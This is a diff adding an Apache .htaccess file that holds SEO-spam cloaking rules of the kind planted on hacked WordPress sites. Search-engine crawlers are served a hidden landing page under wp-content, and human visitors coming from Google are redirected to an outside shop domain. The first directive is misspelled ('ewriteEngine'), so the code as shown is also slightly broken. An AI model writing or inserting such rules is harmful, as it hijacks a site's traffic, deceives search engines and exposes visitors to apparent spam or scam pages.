@@ -1,0 +1,15 @@
+ewriteEngine On
+
+# --- Default front controller fallback ---
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ index.php [L]
+
+# --- Case 1: Googlebot or crawler → Show landing page ---
+RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|duckduckbot|baiduspider|yandex) [NC]
+RewriteRule ^.*$ wp-content/index.php [L]
+
+# --- Case 2: Human visitor coming from Google → Redirect out ---
+RewriteCond %{HTTP_USER_AGENT} !(googlebot|bingbot|slurp|duckduckbot|baiduspider|yandex) [NC]
+RewriteCond %{HTTP_REFERER} ^https?://(www\.)?google\. [NC]
+RewriteRule ^.*$ https://en.nimaxhealthcare.shop/ [R=302,L]
